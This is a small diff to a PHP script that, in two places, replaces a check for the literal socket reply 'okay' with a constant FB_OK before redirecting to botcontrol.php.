@@ -149,7 +149,7 @@ if (isset($_POST['gotaction'])){
         if($bytes_sent){
             $bfr='';
             $bytes_received = @socket_recv($socket, $bfr, 65536, 0);
-			if($bfr=='okay')
+			if($bfr==FB_OK)
 				header("location: botcontrol.php");
             }
 		}
@@ -159,7 +159,7 @@ if (isset($_POST['gotaction'])){
         if($bytes_sent){
             $bfr='';
             $bytes_received = @socket_recv($socket, $bfr, 65536, 0);
-			if($bfr=='okay')
+			if($bfr==FB_OK)
 				header("location: botcontrol.php");
             }
 		}
